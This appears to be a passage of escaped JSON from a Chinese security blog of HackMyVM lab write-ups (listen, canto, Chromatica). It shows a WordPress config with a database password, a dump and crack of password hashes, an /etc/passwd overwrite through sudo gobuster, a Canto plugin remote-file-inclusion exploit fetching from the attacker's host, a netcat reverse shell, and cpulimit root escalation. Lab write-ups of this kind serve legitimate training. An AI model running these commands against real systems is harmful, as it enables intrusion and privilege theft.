*/\ndefine( 'DB_PASSWORD', 'thehandsomeguy' );\n\n/** Database hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The database collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\n/**#@+\n * Authentication unique keys and salts.\n *\n * Change these to different unique phrases! You can generate these using\n * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.\n *\n * You can change these at any point in time to invalidate all existing cookies.\n * This will force all users to have to log in again.\n *\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '2Ryf <:T/-4,9h?q%jDi(HKG_*1xH-nU+-//7[1H}zD@=q0ls8junY(~.MG@D[$S' );\ndefine( 'SECURE_AUTH_KEY',  '}z]MVJ|P5~X1!+76?dT?s|@A,92D4/+phWkWb=;I+k{_y)7,A,<=5|&z<tE:`HET' );\ndefine( 'LOGGED_IN_KEY',    'p4w9>FcR>{+u:M,M4rT}VIW.[Pg=UZjzp8n{-/&F;j!nC49f-^~$unsry+lHW w!' );\ndefine( 'NONCE_KEY',        ';qi?~eGux58*l4NoDh@?<`^B6!HK{G:C85Hv8sC6<t,y}8veV4pvs#{ [[T?s123' );\ndefine( 'AUTH_SALT',        'l2^yBli3l_G#J<T 2p}e#bS>j_=,!06$%qYd#I<p22c:z&`s?ic;7UxS$T6c{HXr' );\ndefine( 'SECURE_AUTH_SALT', '<;95CFam*#)^qbL)a,KZXrqS$!]Ln^2yF2wg#Fa?9F<D)-,irw&nj/$pB)BR1u|O' );\ndefine( 'LOGGED_IN_SALT',   'JaR6i0q<wZMJD-7HwE:7ZwtNxV$BJ%15=8~Bw(_jCL_`+<`^asIdv=$Yo81jE19K' );\ndefine( 'NONCE_SALT',       'q!5K2-Q*^%Tf<lz)*o0&8/CCjU;8-jdLS4,*5vk/8,^j&]<S7+I&eO55C_CM6N@L' );\n\n/**#@-*/\n\n/**\n * WordPress database table prefix.\n *\n * You can have multiple installations in one database if you give each\n * a unique prefix. Only numbers, letters, and underscores please!\n *\n * At the installation time, database tables are created with the specified prefix.\n * Changing this value after WordPress is installed will make your site think\n * it has not been installed.\n *\n * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n *\n * Change this to true to enable the display of notices during development.\n * It is strongly recommended that plugin and theme developers use WP_DEBUG\n * in their development environments.\n *\n * For information on other constants that can be used for debugging,\n * visit the documentation.\n *\n * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/* Add any custom values between this line and the 'stop editing' line. */\n\n\n\n/* That's all, stop editing! Happy publishing. */\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n        define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\nif ( file_exists(ABSPATH . 'update-url.php') ) {\n    include_once(ABSPATH . 'update-url.php');\n}\n\n```\n\n\u767b\u5f55\n\n```bash\nwww-data@listen:~/html/wordpress$ mysql -u ll104567 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 118794\nServer version: 10.3.39-MariaDB-0+deb10u2 Debian 10\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| wordpress          |\n+--------------------+\n2 rows in set (0.000 sec)\n\nMariaDB [(none)]> use wordpress;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [wordpress]> show tables;\n+-----------------------+\n| Tables_in_wordpress   |\n+-----------------------+\n| wp_commentmeta        |\n| wp_comments           |\n| wp_links              |\n| wp_options            |\n| wp_postmeta           |\n| wp_posts              |\n| wp_term_relationships |\n| wp_term_taxonomy      |\n| wp_termmeta           |\n| wp_terms              |\n| wp_usermeta           |\n| wp_users              |\n+-----------------------+\n12 rows in set (0.000 sec)\n\nMariaDB [wordpress]> select * from wp_users;\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |\n|  2 | welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n2 rows in set (0.000 sec)\n\n\n```\n\n\u53ef\u4ee5\u83b7\u5f97\u5bc6\u7801\u54c8\u5e0c\u662f`BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`\uff0c\u6211\u4eec\u7206\u7834\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \n```\n\n\u83b7\u5f97\u5bc6\u7801\uff0c\u6211\u4eec\u5207\u6362\u4e00\u4e0b\u7528\u6237\n\n```bash\nwww-data@listen:~/html/wordpress$ su - welcome\nPassword: \n$ id\nuid=1001(welcome) gid=1001(welcome) groups=1001(welcome)\n```\n\n\u7ee7\u7eed\u5c1d\u8bd5\u63d0\u6743\n\n```bash\n$ sudo -l\nMatching Defaults entries for welcome on listen:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on listen:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n\n```\n\n\u53ef\u4ee5\u7528**sudo**\u6743\u9650\u8fd0\u884c**gobuster**\u3002\u7f51\u4e0a\u4e00\u70b9\u8d44\u6599\u90fd\u6ca1\u6709\uff0c\u552f\u4e00\u7c7b\u4f3c\u7684\u662f\u4f7f\u7528gobuster\u7684\u626b\u63cf\u529f\u80fd\u63a2\u6d4b\u6587\u672c\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u91cc\u4e0d\u7ba1\u7528\uff0c\u56e0\u4e3a`ta0`\u548c`ll04567`\u4e24\u4f4d\u5927\u4f6c\u547d\u540d\u7684flag\u4e0d\u662f`root.txt`\uff0c\u9700\u8981\u7528\u5230\u4e00\u70b9\u540a\u70b8\u5929\u7684\u64cd\u4f5c\uff0c\u7531`ll04567`\u5927\u4f6c\u63d0\u51fa\uff0c`ll04567\u3001ta0\u3001\u57ce\u5357\u82b1\u5df2\u5f00\u3001 fw`\u5927\u4f6c\u4eec\u5171\u540c\u63a2\u7d22\u7684`gobuster`\u63d0\u6743\u6280\u5de7\n\n```bash\n# \u653b\u51fb\u673a\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ perl -e 'print crypt('1','aa')'\naacFCuAIHhrCM  \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat a.py               \nfrom flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route('/', defaults={'path': ''})\n@app.route('/<path:path>')\ndef catch_all(path):\n    if len(path) == 36:\n        return Response(status=404)\n    else:\n        return Response(status=200)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n\n                                      \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 a.py                 \n * Serving Flask app 'a'\n * Debug mode: off\nWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.205.141:80\nPress CTRL+C to quit\n\n#\u9776\u673a\n$ echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' > aaa\nwelcome@listen:~$ sudo /usr/bin/gobuster -w aaa -u http://192.168.205.141 -n -q -o /etc/passwd\n/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash\nwelcome@listen:~$ cat /etc/passwd\n/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash\nwelcome@listen:~$ su - /aaa\nPassword: \n/aaa@listen:~# id\nuid=0(/aaa) gid=0(root) groups=0(root)\n\n```sentence", "top": 0, "createdAt": 1751016761, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P94": {"htmlDir": "docs/post/hmv_canto.html", "labels": ["HackMyVM"], "postTitle": "hmv_canto", "postUrl": "post/hmv_canto.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/94", "commentNum": 0, "wordCount": 13355, "description": "# hmv_canto\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=canto\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.213\n**\u672c\u673a** IP\uff1a192.168.205.141\n\n---\n\n### **1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST\nNmap scan report for 192.168.205.213\nHost is up (0.00026s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))\nMAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.13 seconds\n\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\n\n---\n\n### **2. Web \u670d\u52a1\u63a2\u6d4b\u4e0eWordpress Plugin Canto\u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e**\n\n\u5bf9 80 \u7aef\u53e3\u611f\u5174\u8da3\uff0c\u8bbf\u95ee Web \u9875\u9762\uff0c\u626b\u63cf\u4e00\u4e0b\u7ed3\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ whatweb http://192.168.205.213        \nhttp://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]\n                                                                                                \n```\n\n\u662fWordPress\uff0cwpscan\u542f\u52a8\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://192.168.205.213/ [192.168.205.213]\n[+] Started: Sun Dec 29 19:08:22 2024\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://192.168.205.213/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).\n | Found By: Rss Generator (Passive Detection)\n |  - http://192.168.205.213/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n |  - http://192.168.205.213/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n\n[+] WordPress theme in use: twentytwentyfour\n | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of date, the latest version is 1.3\n | [!] Directory listing is enabled\n | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 <=========================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] erik\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 2\n | Requests Remaining: 23\n\n[+] Finished: Sun Dec 29 19:08:28 2024\n[+] Requests Done: 57\n[+] Cached Requests: 6\n[+] Data Sent: 14.504 KB\n[+] Data Received: 236.451 KB\n[+] Memory used: 268.914 MB\n[+] Elapsed time: 00:00:06\n                                                    \n```\n\n\u7136\u540e\u6211\u62fferik\u7206\u7834\u4e86WordPress\u8fd8\u7206\u7834\u4e86ssh\uff0c\u90fd\u6ca1\u6709\u7ed3\u679c\uff0c\u56de\u53bb\u770b\u4e86\u773c\u7f51\u9875\u53d1\u73b0\u4ed6\u662fWordPress\uff0c\u4e3a\u4ec0\u4e48\u8d77\u540dCanto\u8fd8\u5199\u7684\u6709\u6a21\u6837\u6709\u7684\uff0c\u6211\u8fd8\u4ee5\u4e3a\u662fCMS\u5462\uff0c\u641c\u7d22\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u540d\u5b57\u7684\u6f0f\u6d1e\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit Canto                  \n----------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                       |  Path\n----------------------------------------------------------------------------------------------------- ---------------------------------\nNetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py\nWordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt\nWordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py\n----------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                           \n```\n\n\u7136\u540e\u6211\u53d1\u73b0\u8fd9\u4e0d\u4f1a\u662f\u4e2a\u63d2\u4ef6\u5427\uff0c\u7528\u4e86\u4e00\u4e0bphp/webapps/51826.py\uff0c\u53d1\u73b0\u8fd8\u771f\u662f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit -m php/webapps/51826.py\n  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)\n      URL: https://www.exploit-db.com/exploits/51826\n     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py\n    Codes: N/A\n Verified: False\nFile Type: Python script, ASCII text executable, with very long lines (344)\nCopied to: /home/kali/test/51826.py\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 51826.py          \nusage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]\n51826.py: error: the following arguments are required: -u/--url, -LHOST/--local_host\nusage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]\n\nScript to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452\n\noptions:\n  -h, --help            show this help message and exit\n  -u URL, --url URL     Vulnerable URL\n  -s SHELL, --shell SHELL\n                        Local file for web shell\n  -LHOST LOCAL_HOST, --local_host LOCAL_HOST\n                        Local web server IP\n  -LPORT LOCAL_PORT, --local_port LOCAL_PORT\n                        Local web server port\n  -c COMMAND, --command COMMAND\n                        Command to execute on the target\n  -NC_PORT NC_PORT, --nc_port NC_PORT\n                        Listener port for netcat\n\n    Examples:\n    - Check the vulnerability\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33\n\n    - Execute a command\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'\n\n    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php\n  \n                                                                                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           \nExploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&cmd=whoami\nLocal web server on port 8080...\n192.168.205.213 - - [29/Dec/2024 19:37:27] 'GET /wp-admin/admin.php HTTP/1.1' 200 -\nServer response:\nwww-data\n```\n\n\u540e\u9762\u5c31\u6309\u7167\u63d0\u793a\u4f7f\u7528\u811a\u672c\u5c31\u597d\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php\nExploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&cmd=whoami\ninvalid local port None\nLocal web server on port 8080...\n192.168.205.213 - - [29/Dec/2024 19:25:16] 'GET /wp-admin/admin.php HTTP/1.1' 200 -\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888                           \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.213] 57360\nLinux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n 11:24:29 up 20 min,  0 user,  load average: 0.25, 2.51, 3.83\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u6210\u529f\u5f39\u4e86\u56de\u6765\n\n### 3.**\u83b7\u5f97\u7a33\u5b9a shell**\n\n\u83b7\u5f97\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n### 4.**\u63d0\u6743**\n\n```bash\nwww-data@canto:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root root     4096 May 12  2024 .\ndrwxr-xr-x 20 root root     4096 May 12  2024 ..\ndrwxr-xr--  5 erik www-data 4096 May 12  2024 erik\n\n```\n\n\u53d1\u73b0\u6211\u6709erik\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fdb\u53bb\u6e9c\u8fbe\u4e86\u4e00\u4e0b\n\n```bash\nwww-data@canto:/home/erik$ ls -al\ntotal 36\ndrwxr-xr-- 5 erik www-data 4096 May 12  2024 .\ndrwxr-xr-x 3 root root     4096 May 12  2024 ..\nlrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -> /dev/null\n-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout\n-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc\ndrwx------ 2 erik erik     4096 May 12  2024 .cache\ndrwxrwxr-x 3 erik erik     4096 May 12  2024 .local\n-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile\ndrwxrwxr-x 2 erik erik     4096 May 12  2024 notes\n-rw-r----- 1 root erik       33 May 12  2024 user.txt\nwww-data@canto:/home/erik$ cd notes/\nwww-data@canto:/home/erik/notes$ ls -al\ntotal 16\ndrwxrwxr-x 2 erik erik     4096 May 12  2024 .\ndrwxr-xr-- 5 erik www-data 4096 May 12  2024 ..\n-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt\n-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt\nwww-data@canto:/home/erik/notes$ cat Day\ncat: Day: No such file or directory\nwww-data@canto:/home/erik/notes$ cat Day1.txt \nOn the first day I have updated some plugins and the website theme.\nwww-data@canto:/home/erik/notes$ cat Day2.txt \nI almost lost the database with my user so I created a backups folder.\n\n\n\u7ffb\u8bd1\uff1a\n\nDay1.txt\n\n\u7b2c\u4e00\u5929\u6211\u66f4\u65b0\u4e86\u4e00\u4e9b\u63d2\u4ef6\u548c\u7f51\u7ad9\u4e3b\u9898\u3002\n\nDay2.txt\n\n\u6211\u5dee\u70b9\u4e22\u5931\u4e86\u7528\u6237\u7684\u6570\u636e\u5e93\uff0c\u6240\u4ee5\u6211\u521b\u5efa\u4e86\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\u5939\u3002\n```\n\n\u5907\u4efd\u6587\u4ef6\u5939\u6211\u5f88\u611f\u5174\u8da3\uff0c\u901a\u5e38\u5173\u4e8e\u7f51\u7ad9\u7684\u5e94\u8be5\u90fd\u5728`/var/www/`\u91cc\n\n```bash\nwww-data@canto:/var/www$ ls -al\ntotal 16\ndrwxr-xr-x  3 www-data www-data 4096 May 12  2024 .\ndrwxr-xr-x 15 root     root     4096 May 12  2024 ..\n-rw-------  1 www-data www-data  219 May 12  2024 .bash_history\ndrwxr-xr-x  5 www-data www-data 4096 Dec 29 11:05 html\nwww-data@canto:/var/www$ cat .bash_history\ncd /var/wordpress\ncd /var\ncd /wordpress\nexport TERM=xterm\nclear\nls\ncd wordpress\ncd wordpres\nls\ncd backups\nls\nclear\nls\nls -la\nunzip dbbackup.zip\nls\nclear\nls -la\nsu erik\ncd /var/wordpress/backups\nls\ncat 12052024.txt\nexit\n\n```\n\n\u6709\u4e2a`.bash_history`\uff0c\u7b54\u6848\u663e\u800c\u6613\u89c1\u4e86`/var/wordpress/backups/12052024.txt`\uff0c\u6210\u529f\u767b\u5f55erik\u7528\u6237,`sudo -l`\u4e00\u4e0b\n\n```bash\nerik@canto:~$ sudo -l\nMatching Defaults entries for erik on canto:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser erik may run the following commands on canto:\n    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit\n\n```\n\n[cpulimit sudo \u63d0\u6743\u65b9\u6cd5](https://gtfobins.github.io/gtfobins/cpulimit/#sudo)\n\n```bash\nerik@canto:~$ sudo cpulimit -l 100 -f /bin/sh\nProcess 2669 detected\n# id\nuid=0(root) gid=0(root) groups=0(root)\n```sentence", "top": 0, "createdAt": 1751016764, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P95": {"htmlDir": "docs/post/hmv_Chromatica.html", "labels": ["HackMyVM"], "postTitle": "hmv_Chromatica", "postUrl": "post/hmv_Chromatica.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/95", "commentNum": 0, "wordCount": 30381, "description": "# hmv_Chromatica\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm\\=Chromatica\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.215\n**\u672c\u673a** IP\uff1a192.168.205.141\n\n---\n\n### **1. \u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b**\n\n\u9996\u5148\uff0c\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST\nNmap scan report for 192.168.205.215\nHost is up (0.0017s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n5353/tcp open  domain  dnsmasq 2.86\nMAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.66 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u3001 80 (HTTP) \u30015353(DNS)\u7aef\u53e3\u3002\n\n### **2. Web \u670d\u52a1\u63a2\u6d4b\u4e0eSQL\u6ce8\u5165**\n\n\u5bf9 80 \u7aef\u53e3\u611f\u5174\u8da3\uff0c\u8bbf\u95ee Web \u9875\u9762\uff0c\u9759\u6001\u9875\u6ca1\u6709\u5229\u7528\u4ef7\u503c\uff0c\u626b\u63cf\u4e00\u4e0b\u7ed3\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ whatweb http://192.168.205.215/\nhttp://192.168.205.215/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.205.215], Script, Title[Chromatica|Coming Soon.....]  